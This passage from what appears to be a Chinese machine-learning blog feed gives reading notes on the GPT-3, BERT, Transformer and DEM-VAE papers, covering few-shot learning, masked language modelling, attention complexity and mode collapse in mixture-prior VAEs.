<p>像 BERT、GPT 此类的预训练模型，虽然经过微调后能够很好地应用于各种下游任务。但是微调任务往往也需要数万规模的标注数据集。而对于人类来说，并不需要大规模的数据集才能学习到特定任务，只需要一个简单的描述（例如，请告诉我这些句子的情绪是开心的还是低落的）或者很少的数据（这是两个勇敢的人的例子，请再给出一个勇敢的例子）。因此，如何让预训练模型能够像人一样灵活、通用地解决问题，成了研究者追求的目标。</p>
<p>解决上述问题的想法之一是通过元学习（meta-learning）。元学习的。在语言模型中，元学习意味着模型在训练阶段能够拥有识别通用模式的能力，并在推理阶段快速识别并适应特定任务，如下图所示。</p>
<p><img src="meta-learning.png"></p>
<p>GPT-2 就是通过上下文学习来达到上述效果，具体来说，GPT-2 会将任务嵌入到预料中，例如一个英语到法语的翻译任务的语料为：“”I’m not the cleverest man in the world, but like they say <strong>in French</strong>: Je ne suis pas un imbecile [I’m not a fool].”，进而避免了显式的任务枚举、编码等操作。在这样的语料上训练语言模型，来达到多任务学习的效果。但是这样的一个问题就是模型（虽然有十几亿参数）可能很难学习到这样复杂的依赖关系。虽然 GPT-2 取得了一些初步的结果，但是效果仍远不如微调。</p>
<p><img src="learning-type.png"></p>
<h3 id="参数膨胀">参数膨胀</h3>
<p>自从 NLP 中预训练模型提出以来，参数越多，性能越好基本成为了大家的共识。参数膨胀也成为了预训练模型更新换代的趋势。从 2018 年 BERT 的 3 亿参数，到 GPT-2 的 15 亿参数，再到 2020 年 GPT-3 的 1750 亿参数，每次模型增大都带来了下游任务的改进。其算力的要求也让预训练模型成为大公司垄断的研究方向。</p>
<p>在论文中，作者还实验了从 1.25 亿参数到 130 亿参数间的一系列小模型，并对其在零样本、单样本、少样本实验上的性能进行了评估，结果如下图所示：</p>
<p><img src="model-size.png"></p>
<p>可以看到，三种任务上的性能都随参数的增加而得到提升。</p>
<h3 id="数据污染">数据污染</h3>
<p>在使用像 Common Crawl 这样大规模数据集的时候，可能会出现数据污染问题：由于数据规模过大，测试集的一些样本出现在训练集之中，使得评估不准确。GPT-3 使用的是来自互联网上的文本数据，更有可能出现这样的问题。因此，作者开发了工具来量化数据污染对实验的影响，并对受较大影响的数据集进行了标注。</p>
<h2 id="实验方法">实验方法</h2>
<p>实验的设置与 GPT-2 类似，不同的是，GPT-3 对比了上下文学习的不同设置，包含以下四种方法（单样本与零样本学习区分开来的原因在于，在某些任务例如与人类对话中，单样本学习更匹配）：</p>
<table>
<thead>
<tr class="header">
<th>方式</th>
<th>特点</th>
<th>优点</th>
<th>缺点</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>微调</td>
<td>在下游任务的监督数据集上更新权重</td>
<td>性能好</td>
<td>每个任务都需要较大规模的监督数据</td>
</tr>
<tr class="even">
<td>少样本学习</td>
<td>在下游任务推理时提供 K 个样本（10-100）作为演示，不更新权重</td>
<td>减少了对监督数据规模的要求</td>
<td>效果比微调差的多</td>
</tr>
<tr class="odd">
<td>单样本学习</td>
<td>除了任务的自然语言描述，只有一个演示样本。</td>
<td></td>
<td></td>
</tr>
<tr class="even">
<td>无样本学习</td>
<td>只接受任务的自然语言描述，无演示样本。</td>
<td>使用起来最便利<br>最接近人类执行任务的方式</td>
<td>挑战性最强，在某些情况下非常困难</td>
</tr>
</tbody>
</table>
<p>四种方式介绍如下图所示：</p>
<p><img src="learning-type.png"></p>
<h3 id="模型">模型</h3>
<p>"GPT-3 的模型与 GPT-2 类似，除了 GPT-3 是交替使用密集 Transformer 与局部带状稀疏注意力机制的 Transformer"。这基本就是论文中对 GPT-3 模型的全部介绍了。我翻到 GPT-2 的论文，"GPT-2 是基于 Transformer 的语言模型架构，模型细节大体与 GPT 类似，除了将层标准化提前到子块的输入位置，并在最后一个自注意力机制块后加入层标准化"。套娃现象属实有点严重。</p>
<p>下面是 GPT-1 的结构，看起来就是个 12 层的 Transformer。上面提到的那些局部带状系数注意力机制的 Transformer 等到后面再补充吧。</p>
<p><img src="gpt-1.png"></p>
<h2 id="总结">总结</h2>
<p>GPT 系列的模型结构变化不大，重要的一直是实验部分，从普通的预训练语言模型到试图通过少样本学习解决各种下游任务的庞然大物。整个 GPT-3 的论文，只有十页左右在介绍非实验部分，剩下的几十页都是实验。这次因为时间原因先介绍到这里，实验部分等后续有时间再补充吧。</p>
<p>这篇论文一个最大的写作特点在于引用非常的奇怪。可能是我见识比较少，但是 word2vec，glove 这种写出来非常直观的方法，后面加个引用也非常清晰，论文中却不提缩写，只使用的作者姓首字母加年份的引用，像 word2vec、glove 的引用名分别为 MCCD13、PSM14。只看这个引用让人不知所云，还要点超链接浪费时间。</p>
<h2 id="参考">参考</h2>
]]></content>
      <categories>
        <category>自然语言处理</category>
        <category>预训练模型</category>
        <category>GPT</category>
      </categories>
      <tags>
        <tag>GPT</tag>
      </tags>
  </entry>
  <entry>
    <title>BERT</title>
    <url>/blog/2021/08/16/BERT/</url>
    <content><![CDATA[<h2 id="简介">简介</h2>
<p>今天来看读的是大名鼎鼎的 BERT，出自论文 Google 团队 2018 年的论文《BERT: Pre-training of Deep Bidirectional Transformers for Language Understanding》。BERT（<strong>B</strong>idirectional <strong>E</strong>ncoder Representations from <strong>T</strong>ransformers）可谓是 NLP 历史上划时代的预训练模型，在 11 项自然语言处理任务上都取得了 state-of-the-art。并且，Google 将 BERT 的代码与预训练模型全部开源，便于大家使用。</p>
<span id="more"></span>
<h2 id="预训练语言模型">预训练（语言）模型</h2>
<p>预训练语言模型是自然语言处理中的重要部分，与计算机视觉中的预训练模型类似，也是为了从特定的下游任务中脱离出来，在大量数据上预训练可以解决通用任务的模型。这样以来，下流任务可以根据自己的任务特点进行微调，而不需要从头训练。这样做的好处非常明显：</p>
<ul>
<li>训练时间更短</li>
<li>数据要求更少</li>
</ul>
<p>在计算机视觉中，预训练模型例如 ImageNet 首先得到广泛应用，利用 ImageNet，你可以很快地构造一个特定任务的识别模型，而不需要从头训练，重复捕捉像物体边界等信息。在自然语言处理中，预训练模型应用就没有那么广泛。一个主要的原因就是多义词，例如 “苹果” 既可以代表电脑品牌、也可以代表水果，其具体的含义要根据具体的上下文才能推断出来。而像 word2vec/glove 这样的静态词向量算法，词向量一经训练得到就固定了，所以不能建模一词多义的现象。ELMO 于 2018 年 3 月提出，在双向 LSTM 上预训练语言模型，解决了静态词向量存在的问题，然而还没来得及大展拳脚，就被 2018 年 10 月的 BERT 拍死在了沙滩上。。。</p>
<p>预训练模型可以简单分为两类：</p>
<ul>
<li>基于特征的预训练模型，指利用语言模型的中间结果，作为额外的特征，引入到下游任务中。典型的就是 ELMO。特点：<strong>模型参数是固定的</strong>。</li>
<li>基于微调的预训练模型，指在语言模型的基础上，加入少量的特定任务参数（例如分类任务，加一层 softmax），再在任务数据上微调模型，典型的就是 GPT。特点：<strong>模型参数需要微调</strong>。</li>
</ul>
<p>在 BERT 之前的预训练模型，例如 ELMO 与 GPT，存在的一个重要问题是它们只从单向建模了序列。虽然 ELMO 是使用的双向 LSTM，也只是把双向的隐藏状态进行了拼接，双向的特征信息也没有很好地进行融合。形式化的来说，标准的语言模型就是单向的，当前词的选择只依赖于先前词，例如从左到右方向： <span class="math display">\[
P_{l2r}(x_1,x_2,\dots,x_n)=\prod_{t=1}^nP(x_t|x_{&lt;t})
\]</span></p>
<h3 id="掩码语言模型masked-language-modelmlm">掩码语言模型（masked language model，MLM）</h3>
<p>考虑到标准的语言模型所存在的问题，BERT 提出了一种掩码语言模型的任务，具体做法为：随机遮挡输入中的部分单词，目标是仅根据单词的上下文预测当前位置本来的单词（即遮掩前的单词）。与从左到右的语言模型不同，掩码语言模型能够融合单词的左右上下文。形式化而言，对于<span class="math inline"> \(x_t\)</span> 的概率分布，掩码语言模型计算的是<span class="math inline"> \(P(x_t|x_{&lt;t},x_{&gt;t})\)</span>，标准的语言模型计算的是<span class="math inline"> \(P(x_t|x_{&lt;t})\)</span>。但值得注意的是，掩码语言模型并不是传统的语言模型，一些论文中可能存在二者混用的情况。语言模型的定义可以看我之前的博客 <a href="https://tqnwhz.github.io/blog/2021/07/22/language-model/#more">语言模型 | 一隅</a>。</p>
<p>个人认为掩码语言模型的思路与 cbow 的思想是有些像的，根据一个单词的上下文来预测这个词。</p>
<h2 id="bert">BERT</h2>
<p>BERT 主要分为两个阶段：预训练和微调。两者流程如下所示：</p>
<p><img src="architecture.png"></p>
<p>可以看到，除了输出层，预训练和微调的架构基本上是完全一致的。预训练的权重将会作为下流微调任务的参数的初始权重。在序列中，BERT 加入了两个特殊标记：</p>
<ul>
<li>[CLS]：添加于序列起始位置，作为整个序列的表示，可以用于分类任务。</li>
<li>[SEP]：当输入为一对序列的时候（例如问答任务，一问一答），添加于两序列之中，作为分隔符。</li>
</ul>
<p>BERT 由若干个 <strong>Transformer 编码器</strong>（注意只有编码器）组成，在论文中，作者提出了两种规模的 BERT：</p>
<ul>
<li><span class="math inline">\(BERT_{BASE}\)</span>​：由 12 个 Transformer 编码器堆叠而成，隐节点大小为 768，自注意力机制有 12 个头，约 110M 参数。</li>
<li><span class="math inline">\(BERT_{LARGE}\)</span>​：由 24 个 Transformer 编码器堆叠而成，隐节点大小为 1024，自注意力机制有 16 个头，约 340M 参数。</li>
</ul>
<h3 id="输入输出表征">输入输出表征</h3>
<p>在输入表征上，BERT 使用了 WordPiece 的词嵌入，词表大小为 30000。WordPiece 是一种子词模型，token 粒度介于整个单词与字符之间，例如会将 “working” 这个单词拆分为 “work”、“ing” 两个 token 存储在词表中，"ing" 又可以与其他的动词结合，这样就可以用更小的词表存储更多的单词，也没有损失太多的语义信息。</p>
<p>BERT 的输入既可以是单个序列，也可以是一对序列（例如问答场景）。应用于一对序列时，需要插入 [SEP] 分隔符，并且要使用段嵌入向量。对于输入的每个 token，它的输入表征为以下三个向量的和：</p>
<ul>
<li>符号向量（token embedding），也就是我们传统意义上所说的词向量。</li>
<li>段向量（segement embedding），用以区分一对序列中的两个不同的序列。</li>
<li>位置向量（position embedding），用以编码位置信息。</li>
</ul>
<p><img src="embedding.png"></p>
<p>值得注意的是，<strong>以上三种词向量全部通过学习得到</strong>，这与 Transformer 不同。Transformer 中的位置向量是通过三角函数计算得到，而 BERT 是通过学习得到的。就这一点作者似乎没有进行解释，而 Transformer 的作者在论文中实验结果是，学习得到与使用三角函数的位置向量效果相近，而三角函数更易扩展。一种说法是 BERT 使用的语料更大，可能可以学习到更好的位置向量。</p>
<h3 id="预训练">预训练</h3>
<h4 id="掩码语言模型">掩码语言模型</h4>
<p>在训练时，按一定比例（实验中为 15%）随机屏蔽输入序列中的部分单词（使用 [MASK] 替换），然后预测被屏蔽掉的单词，而不是重建整个输入序列。这个过程与完形填空类似，想象一个句子中有几个单词空缺，掩码语言模型的目标就是根据上下文成功预测空缺的单词。这与语言模型的训练方式还是有较大差别的。</p>
<p>上述方式虽然听上去很合理，但有一个问题，在下流任务的微调阶段，并不会出现 [MASK] 标记，这一定程度上导致了预训练与微调间的不匹配。为了解决这种情况，BERT 并不总是使用 [MASK] 替换掉需要屏蔽的单词，而是按照概率执行对应操作：</p>
<ul>
<li>80% 替换为 [MASK]</li>
<li>10% 替换为随机其他单词</li>
<li> 10% 保持不变</li>
</ul>
<p>之后，被屏蔽掉的单词会被用以预测原本的单词，换而言之，预测概率变为<span class="math inline"> \(P(x_t|x_{&lt;t},x_{mask},x_{&gt;t})\)</span>。这样能够缓解预训练与微调间的不匹配情况。直观来看，BERT 会参考被屏蔽掉单词，因为它有 10% 的概率就是真实的单词，但也不会完全依赖这个单词，因为 10% 的概率还是很小的。</p>
<h4 id="下句预测next-sentence-predictionnsp">下句预测（Next Sentence Prediction，NSP）</h4>
<p>考虑到 NLP 中的很多任务例如问答、自然语言推理都基于句子间关系的理解，而这种句子间的关系不能被语言模型捕获，因此 BERT 提出了一个名为下句预测的预训练任务。顾名思义，这个任务的目标是判断两个句子是否构成上下句的关系。这个任务的数据非常容易获得，在大规模语料上获取连续的两句话，并以 50% 的概率替换真实的下句话，即可得到正负样本分布均匀的数据集。</p>
<h3 id="微调">微调</h3>
<p>在微调时，只需要将特定任务的输入输出放到 BERT 中，微调所有参数，输入的形式可以是单个句子或句子对，可以应用的任务举例如下：</p>
<ul>
<li>单个句子：文本分类、序列标注、情绪分析（利用 [CLS] 符号）</li>
<li>句子对：释义、问答等任务</li>
</ul>
<p>对于句子对，传统的模型往往将其拆分分开处理，而 BERT 将句子对同时投喂到模型中，能够更好地捕获句子间关系。</p>
<h2 id="实验">实验</h2>
<p>实验部分主要介绍了 BERT 微调之后是怎么横扫涵盖通用语言评理解评估等十一项任务的，基线模型有 biLSTM+elmo，GPT 等，这里就不多介绍了。有兴趣的可以去看看原文。</p>
<h2 id="消融实验">消融实验</h2>
<p>消融实验更像是控制变量法，对于模型中的多个改进，控制变量来分析哪个改进对于效果的提升是最大的，这就是消融实验。消融实验细节可以看原文，我在这里总结一下消融实验的结论：</p>
<h3 id="预训练任务">预训练任务</h3>
<ul>
<li>去除下句预测后的 BERT 模型在 QNLI, MNLI 等涉及句子对的任务上的性能损失严重，证明下句预测对于句子间关系的捕获还是很有作用的。</li>
<li>仅使用从左到右的语言模型训练的 BERT 比使用掩码语言模型训练得到的 BERT 效果要差，证明掩码语言模型训练方式的有效性。</li>
</ul>
<h3 id="模型大小">模型大小</h3>
<ul>
<li>参数越多，各项任务上的效果越好，非常的真实。</li>
</ul>
<h3 id="训练步数">训练步数</h3>
<ul>
<li>BERT 真的需要在 128,000 字符 /batch 上训练 1,000,000 步才能达到这么好的效果，训练一百万步比五十万步的 BERT 在 MNLI 获得了 1% 的提升。</li>
<li>掩码语言模型的收敛慢于自左向右的语言模型，但就精度而言，掩码语言模型几乎在训练之初就强于语言模型。</li>
</ul>
<h3 id="基于特征的方法">基于特征的方法</h3>
<ul>
<li>BERT 对基于特征和微调的方法都是有效的。</li>
</ul>
<h2 id="结论">结论</h2>
<p>论文提出了一种全新的预训练任务 -- 掩码语言模型，并在该任务和下句预测任务上预训练了一个基于双向 Transformer 的深层模型 BERT。在十一项 NLP 任务上的微调实验结果表明，BERT 的效果优于现有的预训练模型。</p>
<p>BERT 的论文断断续续读了几天，读下来感觉醍醐灌顶，很多之前模棱两可的东西都真正了解了。果然读论文还是要读原文，别人的博客只是参考。后面有空了再读一读 BERT 的源码，又想去读 GPT 的论文，时间也太少了。</p>
<h2 id="参考">参考</h2>
<p><a href="https://zhuanlan.zhihu.com/p/46833276">论文解读：BERT 模型及 fine-tuning - 知乎 (zhihu.com)</a></p>
]]></content>
      <categories>
        <category>自然语言处理</category>
        <category>预训练模型</category>
        <category>BERT</category>
      </categories>
      <tags>
        <tag>预训练模型</tag>
        <tag>BERT</tag>
      </tags>
  </entry>
  <entry>
    <title>Transformer</title>
    <url>/blog/2021/08/14/Transformer/</url>
    <content><![CDATA[<h2 id="简介">简介</h2>
<p>今天读的是大名鼎鼎的 BERT------- 的组件之一 Transformer，出自论文 Google 团队 2017 年的论文《Attention Is All You Need》。与传统的 GRU、LSTM 等相比，Transformer 只使用注意力机制来建模输入与输出间的依赖关系，并支持并行化。论文在机器翻译上进行了实验，Transfomer 达到了更好的效果，因此自提出以来，就得到了极为广泛的关注。</p>
<span id="more"></span>
<h2 id="题外话">题外话</h2>
<p>之前由于换电脑的原因，断更了一段时间。BERT 与 Transformer 的论文之前也粗读过一两次，还是有些一知半解，正好趁这个周末再复习总结一下，记录在博客里。希望我的博客能对你有所帮助。</p>
<h2 id="模型结构">模型结构</h2>
<p>Transformer 使用的仍然是 encoder-decoder 架构，但与 RNN 等自回归模型不同，Transformer 使用的是堆叠的多头注意力机制，全连接层等，其模型结构如下所示：</p>
<p><img src="architecture.png"></p>
<p>左侧的为单个编码器的结构，第一层为多头注意力、残差层与层标准化，第二层是前馈神经网络。编码网络是由若干个编码器堆叠而成的，原论文中 N=6，嵌入向量维度为 512。</p>
<p>右侧为单个解码器的结构，主要在编码器的基础上，加入了一个 Masked 的多头注意力机制，用以保证每个时间步的输出只已知已经输出的信息。同样的，解码网络也有 6 个解码器组成。</p>
<h3 id="注意力机制">注意力机制</h3>
<p>多头注意力机制可谓是 Transformer 的核心，详细过程可以参考<a href="https://blog.csdn.net/longxinchen_ml/article/details/86533005">图解 Transformer 完整版</a>。这里只做核心部分介绍，单头计算过程为： <span class="math display">\[
Attention(Q,K,V)=softmax(\frac{QK^\intercal}{\sqrt{d_k}})V
\]</span> Q，K，V 分别为查询、键、值矩阵，由词嵌入向量矩阵映射得出。多头注意力机制使用点乘计算相似度，不同的是，这里除以了一个标量<span class="math inline"> \(\sqrt{d_k}\)</span>​​​。这个标量是 softmax 的温度系数，由于点积结果方差可能很大，可能会存在梯度过小无法正常更新的情况。除以一个标量能够使得概率分布更加均匀。这一部分可以参考学习下 softmax 的温度系数。</p>
<p>作者发现，相较于仅使用一个注意力机制，使用多个注意力机制并将其拼接能够拥有更好的效果。在论文中，作者使用 8 个注意力机制，每个注意力机制的输出为 512/8=64 维嵌入向量。</p>
<h3 id="注意力机制的使用">注意力机制的使用</h3>
<p>多头注意力机制以三种方式在模型中使用：</p>
<ul>
<li>编码器与解码器间的注意力：查询 q 来自解码器，键 K 与值 V 来自编码器。这里的注意力机制用以在输出的每一步关注在输入序列的不同部分，与 seq2seq 的注意力机制相似、</li>
<li>编码器内的自注意力：查询、键、值均来自编码器。输入序列的每个位置可以得到到整个输入序列的信息。</li>
<li>解码器内的掩码自注意力：查询、键、值均来自解码器。为了保证解码器只能获得已输出的部分序列的信息，将当前位置之后位置的标量化点积设置为<span class="math inline"> \(-\infty\)</span>​，进而经过 softmax 后概率值为 0。</li>
</ul>
<h3 id="前馈神经网络">前馈神经网络</h3>
<p>在编码器和解码器中的前馈神经网络，搭配 relu 激活函数来为模型构造非线性计算。计算过程如下所示： <span class="math display">\[
FFN(x)=\max(0,xW_1+b_1)W2+b_2
\]</span> 其中，输入和输出的维度均为 512，隐藏层维度为 1024。另外，前馈神经网络在每个层内不共享参数，换而言之，它们的参数是独立的。</p>
<h3 id="位置编码">位置编码</h3>
<p>由于 Transformer 中不存在 RNN 中的自回归结构，输入序列的不同位置是等价的。为了编码位置信息，作者引入了位置编码，使用 sin 与 cos 函数： <span class="math display">\[
PE_{(pos,2i)}=\sin(pos/10000^{2i/d_{model}})
\]</span></p>
<p><span class="math display">\[
PE_{(pos,2i+1)}=\cos(pos/10000^{2i/d_{model}})
\]</span></p>
<p>其中，pos 为位置，i 为向量维度。作者称选取三角函数的原因是假设这样可以更好地使模型学到相对位置关系，对于任意固定的偏移 k，<span class="math inline">\(PE_{pos+k}\)</span> 可以表示为<span class="math inline"> \(PE_{pos}\)</span> 的线性函数。另外，作者还尝试了学习位置编码的方式，实验对比显示，二者结果差别不大。因此作者最终选择了上述编码方式，因为它可以处理更长的序列。</p>
<h2 id="为什么使用自注意力机制">为什么使用自注意力机制</h2>
<p>论文从计算时间复杂度、序列操作数、最长路径长度三方面对比了自注意力机制、RNN、CNN 以及受限的自注意力机制，结果如下：</p>
<p><img src="comparison.png"></p>
<p>这一部分计算过程论文没有给出，我参考了 <a href="https://zhuanlan.zhihu.com/p/264749298">Transformer/CNN/RNN 的对比（时间复杂度，序列操作数，最大路径长度）</a>，这里简单介绍一下。</p>
<h3 id="计算时间复杂度">计算（时间）复杂度</h3>
<p>计算复杂度主要取决于计算的规模，以矩阵乘法为例，形状为 NxM 的矩阵与形状为 MxP 的矩阵相乘，得到一个 NxP 的矩阵。结果矩阵中的每个元素为 M 维向量内积的结果，进行 M 次乘法，并求和。所以整个矩阵乘法的复杂度为<span class="math inline"> \(O(NMP)\)</span>。</p>
<h4 id="自注意力机制">自注意力机制</h4>
<p><span class="math display">\[
Attention(Q,K,V)=softmax(\frac{QK^\intercal}{\sqrt{d_k}})V
\]</span></p>
<p>其中，Q，K 分别为 nxd 与 dxn 的矩阵，<span class="math inline">\(QK^\intercal\)</span>​的复杂度为<span class="math inline"> \(O(n^2d)\)</span>​​，softmax 的复杂度为<span class="math inline"> \(O(n^2)\)</span>，加权求和的矩阵形状分别为 nxn 与 nxd，复杂度为<span class="math inline"> \(O(n^2d)\)</span>，因此总复杂度为<span class="math inline"> \(O(n^2d)\)</span>​。受限自注意力机制与之同理，区别在于它只使用查询最近的 k 个</p>
<h4 id="rnn">RNN</h4>
<p><span class="math display">\[
h_t=f(Ux_t+Wh_{t-1})
\]</span></p>
<p>其中，U 与 x 的形状分别为 dxd 与 dx1（假设隐藏状态与输入维度均为 d），复杂度为<span class="math inline"> \(O(d^2)\)</span>​，W 与 h 的形状分别为 dxd 与 dx1，复杂度同样为<span class="math inline"> \(O(d^2)\)</span>。对于长度为 n 的序列，总复杂度为<span class="math inline"> \(O(nd^2)\)</span>。</p>
<h4 id="cnn">CNN</h4>
<p>将输入序列进行 padding 后，总共需要 n 次卷积，每次卷积计算量为 kxd，假设步长为 1，单个卷积核复杂度为<span class="math inline"> \(O(nkd)\)</span>​。为了保证维度相同，需要使用 d 个卷积核，总复杂度为<span class="math inline"> \(O(nkd^2)\)</span></p>
<h3 id="序列操作数">序列操作数</h3>
<p>序列操作数主要衡量了并行化的支持情况，只有 RNN 需要串行地完成 n 次序列操作，其他模型均支持并行化。</p>
<h3 id="最长路径长度">最长路径长度</h3>
<p>最长路径为序列中首尾 token 在模型中的路径，其长度越长，依赖越不容易被捕捉到。对于自注意力机制，序列中的任意两个元素均可以看作直接相连，路径长度为<span class="math inline"> \(O(1)\)</span>。而 RNN 中，第一个 token 的信息需要进行 n 次迭代才能到达最后一个 token，最大路径长度即为<span class="math inline"> \(O(n)\)</span>。CNN 中，通过若干个卷积层来获取不同位置的信息，每个卷积层（论文中使用的是空洞卷积）相当于让序列信息浓缩了 k 倍（卷积层的输出中的每个位置都有输入中 k 个位置的信息），最大路径长度为<span class="math inline"> \(O(log_kn)\)</span>​。受限的自注意力机制与连续卷积类似，每次卷积相当于可以获取连续 k 个位置的信息，最大路径长度为<span class="math inline"> \(O(n/k)\)</span>。</p>
<p>这就基本解释了这个突兀的表格是怎么计算得来的了。那么可以总结自注意力机制的优点是：</p>
<ul>
<li>单层计算量更少。在实际应用中，序列长度 n 往往小于表征维度 d，因此，自注意力机制的单层计算量相较于 RNN 与 CNN 都要更小。</li>
<li>支持并行化。这个就不说了，全世界都在针对 RNN。</li>
<li>能够更好地捕捉长距离依赖。相较于 CNN 与 RNN，自注意力机制的最长路径最短。</li>
<li>可解释性更强。作者将注意力机制的概率分布展示如下，证明多头注意力的多个头完成了与句子语义与结构相关不同的工作。</li>
</ul>
<p><img src="example.png"></p>
<p>上图是作者给出的多头注意力的例子，使用了两个头。对于 its 这个单词，得到了非常尖锐的概率分布，its 主要与 law 与 application 相关联，一个头捕获到了 its 指代的主体 law，一个头捕获到了 its 的目标 application。个人感觉这个效果也太过于理想了。。。可能这就是 Transformer 吧。</p>
<h2 id="总结">总结</h2>
<p>这篇论文提出了完全依赖于注意力机制的序列转换模型 Transformer，相较于 RNN，它有着可并行化、解释性更强、单层参数更少等优点。在机器翻译上取得了 state-of-the-art，在英语成分分析上也取得了比 RNN 更优的结果。</p>
<h2 id="参考">参考</h2>
<ul>
<li><a href="https://www.cnblogs.com/sandwichnlp/p/11612596.html#nlp界cnn模型的进化史">三大特征提取器（RNN/CNN/Transformer） - 西多士 NLP - 博客园 (cnblogs.com)</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/264749298">Transformer/CNN/RNN 的对比（时间复杂度，序列操作数，最大路径长度）</a></li>
</ul>
]]></content>
      <categories>
        <category>自然语言处理</category>
        <category>BERT</category>
      </categories>
      <tags>
        <tag>BERT</tag>
        <tag>Transformer</tag>
        <tag>多头注意力机制</tag>
      </tags>
  </entry>
  <entry>
    <title>DEM-VAE</title>
    <url>/blog/2021/07/30/DEM-VAE/</url>
    <content><![CDATA[<h2 id="序言">序言</h2>
<p>DEM-VAE 是字节跳动 AI LAB 团队于 2020 年发表的《Dispersed Exponential Family Mixture VAEs for Interpretable Text Generation》论文中提出的模型，论文收录在 ICML 中。论文名直译为 “用于<strong>可解释</strong>文本生成的<strong>分散指数族混合</strong> VAE ”。</p>
<span id="more"></span>
<h2 id="题外话">题外话</h2>
<p>最近实习面试结束了，回来更新博客了。“黄色的树林里分出两条路，可惜我不能同时去涉足”，最近有些感慨。看到这篇博客的人，希望这篇博客能对你有所帮助，也希望你天天开心。</p>
<h2 id="简介">简介</h2>
<p>连续型 VAE 的隐变量难以解释分散属性，例如主题、对话动作等。这一点与 VQ-VAE 的动机相似。然而只使用分散隐变量的 VAE 的表达能力有限，隐变量<span class="math inline"> \(c\)</span>​只包含<span class="math inline"> \(log(\#c)\)</span>​位的信息，其中<span class="math inline"> \(\#c\)</span>​为<span class="math inline"> \(c\)</span>​​可选值的数量。（这里的意思应该是信息论中的 “信息量”，默认隐变量服从均匀分布，各值取得的概率相等，信息量<span class="math inline"> \(-log(1/\#c)=log(\#c)\)</span>​。）</p>
<p>混合高斯分布的 VAE（GM-VAE）提供了一种自然的想法，将分散隐变量与连续隐变量结合：每个高斯分布代表一个分散属性值，分量的值代表属性相同的句子。在理想情况下，不同高斯分布的均值与方差应该差别很大。然而 GM-VAE 容易出现模式崩溃问题，这使得不同高斯分布的均值与方差非常接近，GM-VAE 退化为只有一个高斯分量的普通 VAE。如下图所示：</p>
<p><img src="example.png"></p>
<p>在本文中，作者证明了模式崩溃问题不仅存在于 GM-VAE 中，而是具有指数族混合先验分布的 VAE（EM-VAE）的普遍问题，由证据下界中的一个分散项引起。进而，作者提出了一个船新的 DEM-VAE，在 EM-VAE 的目标函数里引入了额外一项分散项。按照论文的说法，DEM-VAE 虽然适度减小了句子的似然（由于引入了新的损失项），但是在 rPPL（reverse perplexity）与 BLEU 得到了更好的结果，并且能够有效地避免模式崩溃问题。</p>
<h2 id="模式崩溃vs后验崩塌">模式崩溃 vs 后验崩塌</h2>
<p>普通的 VAE 会面临后验坍塌（KL 散度消失）的问题，具体而言，KL 损失项在训练之初迅速变为 0。而本文要解决的是模式崩溃问题，是指先验分布中的多个模式崩溃为一个模式。模式崩溃会后验坍塌之间无必然联系。在后验坍塌未出现时，也可能出现模式崩溃。</p>
<p>虽然本文采用的解决方案与之前的解决后验坍塌的方案有些相似：找到目标函数中导致问题的那一项并削弱它的影响。但是本文采用的解决方案只引入了一个启发式的分散项，而不是整个 KL 损失项。</p>
<h2 id="解决方法">解决方法</h2>
<h3 id="混合指数族vae">混合指数族 VAE</h3>
<p>混合指数族 VAE 是指使用混合指数族分布作为先验分布的 VAE（<a href="https://en.wikipedia.org/wiki/Exponential_family">Exponential family - Wikipedia</a>），最为常见的就是混合高斯分布的 VAE，GM-VAE，它的先验分布为混合的高斯分布。GM-VAE 使用一个分散变量<span class="math inline"> \(c\)</span> 代表不同的高斯成分，连续隐变量<span class="math inline"> \(z\)</span> 依赖于<span class="math inline"> \(c\)</span>。如下图所示：</p>
<p><img src="gm-vae.png"></p>
<p>其中，实现为依赖关系，虚线为变分后验。其中，<span class="math inline">\(p(c)\)</span>​可以近似为均匀分布，<span class="math inline">\(p_\eta(z|c)\)</span>​为指数族分布，例如高斯分布。</p>
<p>测试时：从先验分布<span class="math inline"> \(p(c)\)</span> 中采样一个<span class="math inline"> \(c\)</span>，然后从<span class="math inline"> \(c\)</span> 对应的高斯分布中采样隐变量<span class="math inline"> \(p(z|c)\)</span>，接着投喂到解码器<span class="math inline"> \(p(x|z)\)</span> 中。</p>
<p>训练时：通过最大化边际似然<span class="math inline"> \(\int\sum_cp_\eta(z,c)p_\theta(x|z)dz\)</span>​​进行训练是不可行的。与 VAE 一样，使用近似后验分布<span class="math inline"> \(q_\phi(z,c|x)=q_\phi(z|x)q_\phi(c|x)\)</span>​作为<span class="math inline"> \(p(z,c|x)\)</span>​​​的估计，进一步改为优化如下所示的证据下界：</p>
<p><img src="elbo.png"></p>
<h3 id="模式崩溃问题">模式崩溃问题</h3>
<p>作者通过研究 ELBO 目标函数，将导致模式崩溃的原因定位到<span class="math inline"> \(\mathcal R_c\)</span> 与<span class="math inline"> \(\mathcal R_z\)</span> 中。作者从指数族分布的参数化定义出发，将损失项<span class="math inline"> \(\mathcal R_z,\mathcal R_c\)</span>​重写为 KL 平均正则项与分散项<span class="math inline"> \(\mathcal L_d\)</span>​​。 <span class="math display">\[
\mathcal L_d=\mathbb E_{q_\phi(c|x)}A(\eta_c)-A(\mathbb E_{q_\phi(c|x)}\eta_c)&gt;=0
\]</span> 作者得出结论，最小化分散项<span class="math inline"> \(\mathcal L_d\)</span>​使得先验分布的加权方差（即模式崩溃趋势）。这一部分的数学推导较为复杂，有兴趣的可以去看看原文。因此，作者提出在损失函数中加入一项正的分散项来抵消这一趋势，最终损失函数如下所示： <span class="math display">\[
L(\theta;x)=ELBO+\beta \cdot \mathcal L_d
\]</span> 其中，<span class="math inline">\(\beta\)</span>​是一个超参数，通过调整<span class="math inline"> \(\beta\)</span>​​来达到平衡模式崩溃与正常训练。</p>
<h3 id="dem-vae">DEM-VAE</h3>
<p>在上述方法基础上，作者发现，使用额外的互信息项能够进一步优化可解释性，这一部分可以在实验结果中看到。互信息项在之前的工作中用于缓解 KL 散度消失的问题，定义如下： <span class="math display">\[
\mathcal L_{mi}=\mathcal H(c)-\mathcal H(c|x)=\mathbb E_x\mathbb E_{q_\phi(c|x)}(logq_\phi(c|x)-logq_\phi(c))
\]</span> 公式部分介绍完毕。在模型结构上，编码器为 GRU 等循环单元、解码器为一个语言模型。</p>
<h2 id="实验">实验</h2>
<h3 id="模式崩溃实验结果">模式崩溃实验结果</h3>
<p><img src="mode-collapse-result.png"></p>
